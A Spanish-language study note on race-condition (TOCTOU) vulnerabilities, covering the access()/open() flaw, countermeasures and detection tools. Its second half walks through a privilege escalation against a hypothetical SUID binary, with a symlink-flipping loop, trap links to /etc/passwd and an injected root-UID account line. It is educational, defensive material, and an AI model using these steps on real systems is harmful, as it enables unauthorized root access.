---
title: "Condiciones De Carrera"
date: 2026-01-26
tags:
  - ciberseguridad
  - redes-protocolos
  - vulnerabilidades-y-amenazas
---
### Condiciones de Carrera – Nota expandida


> **Relacionado**: [[01-Ciberseguridad/Herramientas/Tripwire|Tripwire]]. [[01-Ciberseguridad/Gestion-Seguridad/Tema4Auditoria/Controles|Controles]]. [[00-Inicio/HOME|HOME]]. [[02-Ciencias-Computacion/Redes/Herramientas|Herramientas]]. [[02-Ciencias-Computacion/Sistemas-Operativos/UNIX/comandos/chmod|chmod]].

Las **condiciones de carrera (race conditions)** son un tipo de vulnerabilidad que ocurre cuando **dos o más procesos acceden a un recurso compartido (archivo, memoria, etc.) y su resultado depende del orden en que se ejecutan las operaciones**. En ciberseguridad, los atacantes explotan estas condiciones para **interceptar, modificar o sustituir datos entre dos operaciones críticas** del sistema.

---

###  ¿Qué es una condición de carrera?

Una **race condition** aparece cuando hay una **ventana de tiempo (race window)** entre:

1. Una comprobación de seguridad (por ejemplo, verificar permisos).
    
2. El uso del recurso (por ejemplo, abrir el archivo).
    

Si el atacante **interviene entre esos dos pasos**, puede modificar el resultado de la operación sin que el sistema se dé cuenta.

---

###  Ejemplo clásico de código vulnerable (C):

```c
if (access("archivo.txt", R_OK) == 0) {
    fd = open("archivo.txt", O_RDONLY);
    // leer o procesar archivo
}
```

 **Problema**: entre `access()` y `open()`, el atacante puede **reemplazar el archivo** por otro (por ejemplo, `/etc/shadow`) mediante un enlace simbólico.

---

###  Objetivo del atacante

- **Leer archivos restringidos** (escalada de privilegios).
    
- **Sobrescribir archivos críticos** (persistencia o DoS).
    
- **Desviar flujos de ejecución** o **cargar binarios maliciosos**.
    
- **Explotar binarios SUID** con permisos elevados.
    

---

###  Ejemplo práctico de ataque: uso de enlaces simbólicos

#### Escenario:

- Un binario SUID root escribe en `/tmp/tempfile` tras comprobar que el usuario tiene permisos.
    

#### El atacante:

1. Crea un enlace simbólico:
    

```bash
ln -s /etc/shadow /tmp/tempfile
```

2. Ejecuta el binario en el momento justo (por ejemplo, con un script que alterna el enlace rápidamente).
    
3. Si el ataque tiene éxito, el binario **escribe o modifica `/etc/shadow`**.
    

---

### ️ Cómo se explotan: scripts de cambio rápido (symlink flip)

```bash
while true; do
  rm -f activedir
  ln -s dir0 activedir
  sleep 0.001
  rm -f activedir
  ln -s dir1 activedir
done
```

→ El script **cambia continuamente los enlaces simbólicos**, intentando ganar la carrera contra el binario víctima.

---

###  Recursos típicamente vulnerables

- Archivos temporales en `/tmp`.
    
- Comprobaciones de permisos (`access`, `stat`) separadas de la operación real (`open`, `unlink`, `chmod`).
    
- Scripts mal diseñados que manipulan archivos críticos sin protección.
    
- Cron jobs que ejecutan archivos externos o desde ubicaciones predecibles.
    

---

### ️ Contramedidas

####  A nivel de programación segura

- **Evitar llamadas inseguras** como `access()` antes de `open()`.
    
- Usar `open()` con el flag `O_CREAT | O_EXCL` para evitar que se sobrescriba un archivo existente.
    
- Usar `fstat()` sobre descriptores en lugar de nombres de archivo.
    
- Validar que los archivos no son enlaces simbólicos (`lstat`, `S_ISLNK`).
    
- Abrir archivos con UID efectivo ya seteado (`setuid`) para evitar cambios tras la apertura.
    

####  A nivel del sistema

- Montar `/tmp` con `noexec`, `nodev`, `nosuid`.
    
- Utilizar directorios temporales por usuario (`/tmp/user123/`).
    
- Emplear `AppArmor`, `SELinux` o control de integridad (Tripwire) para detectar cambios inesperados.
    
- Monitorear accesos simultáneos sospechosos a recursos sensibles.
    

---

###  Herramientas para detección de race conditions

- **Racer**: herramienta para encontrar condiciones de carrera en código.
    
- **Symlink race scanners**: scripts que buscan accesos predecibles a archivos temporales.
    
- **strace / ltrace**: para auditar ejecución y detectar operaciones inseguras.
    
- **Auditd**: monitorea acceso y modificación de archivos.
    

---

### Conclusión

Las **condiciones de carrera son vulnerabilidades sutiles pero peligrosas**, difíciles de detectar en código pero muy explotables en sistemas mal diseñados o desactualizados. Son especialmente peligrosas cuando afectan **programas con privilegios elevados (como SUID root)**. Prevenirlas requiere una combinación de **prácticas seguras de programación, controles de acceso estrictos y monitoreo activo**.

---
Escalar privilegios mediante **condiciones de carrera (race conditions)** se basa en **aprovechar un intervalo de tiempo crítico** durante el cual un programa con privilegios altos (por ejemplo, SUID root) realiza una comprobación y luego ejecuta una acción **confiando en que las condiciones no han cambiado**. El atacante **interviene justo en ese intervalo** para engañar al sistema.

Vamos a ver cómo se puede **escalar privilegios a root** usando este tipo de ataque con un ejemplo paso a paso.

---

###  Escalada de privilegios con Race Condition – Ejemplo realista

####  Escenario

Tienes un binario SUID (`/usr/bin/vulnprog`) que corre como root. El programa:

1. Verifica si el archivo `/home/user/temp.txt` es propiedad del usuario.
    
2. Si lo es, lo abre y lo copia en `/etc/passwd` o lo modifica con privilegios root.
    

>  El programa hace:

```c
if (access("temp.txt", R_OK) == 0) {
    fd = open("temp.txt", O_RDONLY);
    // lo copia o modifica con privilegios root
}
```

---

###  Objetivo del atacante

Reemplazar `temp.txt` por un **enlace simbólico a `/etc/shadow` o `/etc/passwd`** justo después de que el binario lo verifique, pero **antes de que lo abra/modifique**.

---

###  Paso a paso: cómo se escala a root

#### 1. Crear archivos trampa

```bash
mkdir /tmp/race0
mkdir /tmp/race1
echo "tu_entrada_maliciosa" > /tmp/falso
ln -s /tmp/falso /tmp/race0/temp.txt
ln -s /etc/passwd /tmp/race1/temp.txt
```

#### 2. Preparar el script de "flipping" (cambia el symlink en bucle)

```bash
while true; do
  rm -f /tmp/activedir
  ln -s /tmp/race0 /tmp/activedir
  sleep 0.001
  rm -f /tmp/activedir
  ln -s /tmp/race1 /tmp/activedir
done
```

#### 3. Lanzar el programa vulnerable al mismo tiempo

```bash
/usr/bin/vulnprog /tmp/activedir/temp.txt
```

 Lo que ocurre:

- Cuando el binario verifica los permisos, el archivo apunta a `/tmp/falso`, que es tuyo.
    
- Justo después, mientras va a abrir el archivo, el enlace simbólico apunta a `/etc/passwd`.
    
- El binario **abre y modifica `/etc/passwd` como root**, usando tus datos.
    

#### 4. Resultado: escalada

Si logras inyectar una línea en `/etc/passwd` del tipo:

```text
hacker:x:0:0::/root:/bin/bash
```

Y luego haces:

```bash
su hacker
```

 ¡Tienes shell como root!

---

### ️ ¿Por qué esto funciona?

Porque el programa separa **la comprobación (`access()`) de la acción (`open()`)**, y entre ambas **no garantiza que el recurso no haya cambiado**.

---

###  Cómo prevenir esto (para desarrolladores)

- Usar `open()` con `O_NOFOLLOW` y `O_CREAT|O_EXCL` para evitar symlinks.
    
- Evitar `access()` y similares como medida de seguridad.
    
- Usar `fstat()` directamente sobre descriptores abiertos.
    
- Usar directorios temporales exclusivos (`/tmp/programa.XXXXXX`) con permisos correctos.
    
- Usar `seteuid()` solo después de abrir el recurso seguro.
    

---

### Conclusión

Las condiciones de carrera permiten escalar privilegios en sistemas mal programados, especialmente si se manipulan **archivos temporales, SUIDs o cron jobs**. Con un simple script de flip y un binario vulnerable, puedes **obtener root sin necesidad de exploits de kernel**.

---